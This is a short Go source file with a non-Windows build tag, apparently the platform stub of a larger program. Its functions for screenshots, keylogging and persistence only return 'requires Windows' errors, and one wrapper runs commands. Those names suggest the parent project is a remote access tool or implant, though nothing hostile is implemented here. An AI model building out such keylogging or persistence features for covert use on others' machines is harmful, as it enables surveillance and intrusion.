//go:build !windows

package main

import (
	"errors"
	"os/exec"
)

func newCommand(name string, args ...string) *exec.Cmd {
	return exec.Command(name, args...)
}

func captureScreenshot() (string, error) { return "", errors.New("screenshots require Windows") }

func keylogAction(string) (string, string, error) {
	return "", "output", errors.New("keylogging requires Windows")
}

func persistenceAction(bool, *config) (string, error) {
	return "", errors.New("persistence requires Windows")
}
